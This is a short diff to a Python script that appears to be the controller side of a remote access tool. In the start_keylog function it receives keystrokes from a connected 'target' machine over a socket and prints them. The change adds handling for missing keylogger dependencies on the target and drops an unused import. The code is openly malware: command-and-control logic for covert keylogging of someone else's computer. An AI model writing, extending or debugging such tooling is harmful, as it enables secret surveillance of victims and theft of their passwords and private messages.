@@ -2,7 +2,6 @@ import os
 import socket, threading, time
 import sys
 import signal
-from xml.dom import IndexSizeErr
 
 SERVER_ADDR = "127.0.0.1"
 SERVER_PORT = 8080
@@ -193,6 +192,9 @@ def start_keylog(cmd,conn):
             print("Keylogger in progress...\nUse ctrl+z & ctrl+c to end logging.\n")
             print(f"{log}",end="\r")
             out = conn.recv(BUFFER_SIZE).decode()
+            if out == "NO_DEPENDENCIES":
+                print("Dependencies for keylogger not installed on target.")
+                break
             os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
             if out == "BACKSPACE": #If the user hit backspace, delete one keystroke from the string
                 try:
